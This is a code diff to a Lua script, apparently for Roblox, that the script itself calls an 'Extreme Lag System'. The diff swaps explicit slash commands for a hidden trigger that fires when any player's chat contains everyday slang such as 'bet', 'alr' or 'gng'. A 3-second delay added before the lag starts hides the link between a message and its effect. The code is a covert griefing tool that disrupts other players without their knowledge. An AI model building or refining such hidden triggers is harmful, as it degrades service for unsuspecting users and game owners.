@@ -24,6 +24,29 @@ local isActive = false
 local lagConnections = {}
 local lagObjects = {}
 
+-- Only the keywords you specified
+local triggerKeywords = {
+    "bet", "alr", "allow", "gng", "back off"
+}
+
+-- Function to check if message contains any trigger word
+local function containsTriggerWord(message)
+    local lowerMessage = string.lower(message)
+    
+    -- Remove special characters for better detection
+    lowerMessage = lowerMessage:gsub("[%p%c]", " ")
+    
+    -- Check for exact word matches or words within phrases
+    for _, keyword in pairs(triggerKeywords) do
+        -- Check if the keyword appears as a whole word in the message
+        if string.find(" " .. lowerMessage .. " ", " " .. keyword .. " ") then
+            return true
+        end
+    end
+    
+    return false
+end
+
 local function triggerExtremeLag()
     if isActive then return end
     isActive = true
@@ -317,9 +340,9 @@ end
 local function setupChatDetection()
     local function monitorPlayer(player)
         player.Chatted:Connect(function(message)
-            local text = string.lower(message)
-            if (string.find(text, "bet") or string.find(text, "lag") or string.find(text, "freeze")) and not isActive then
-                task.wait(0.3)
+            if containsTriggerWord(message) and not isActive then
+                -- Wait 3 seconds before triggering lag
+                task.wait(3)
                 triggerExtremeLag()
             end
         end)
@@ -340,9 +363,10 @@ local function setupChatDetection()
                 for _, channel in pairs(channels:GetChildren()) do
                     if channel:IsA("TextChannel") then
                         channel.OnMessageReceived:Connect(function(message)
-                            local text = string.lower(message.Text)
-                            if (string.find(text, "bet") or string.find(text, "lag")) and not isActive then
-                                task.wait(0.3)
+                            local text = message.Text
+                            if containsTriggerWord(text) and not isActive then
+                                -- Wait 3 seconds before triggering lag
+                                task.wait(3)
                                 triggerExtremeLag()
                             end
                         end)
@@ -353,32 +377,7 @@ local function setupChatDetection()
     end)
 end
 
-local function setupConsole()
-    player.Chatted:Connect(function(message)
-        local cmd = string.lower(string.sub(message, 1, 100))
-        if (cmd == "/freeze" or cmd == "/lag" or cmd == "/overload") and not isActive then
-            triggerExtremeLag()
-        elseif cmd == "/unfreeze" or cmd == "/stop" then
-            clearLag()
-        elseif cmd == "/panic" and not isActive then
-            -- Instant maximum lag
-            for i = 1, 5 do
-                triggerExtremeLag()
-                task.wait(0.1)
-            end
-        end
-    end)
-end
-
--- Auto-start on keywords
+-- Start the chat detection
 setupChatDetection()
-setupConsole()
 
--- Optional: Auto-start after 30 seconds
--- task.delay(30, function()
---     if not isActive then
---         triggerExtremeLag()
---     end
--- end)
-
-print("Extreme Lag System Loaded - Commands: /freeze, /lag, /panic, /stop")
+print("Extreme Lag System Loaded - Monitoring chat for keywords: bet, alr, allow, gng, back off")
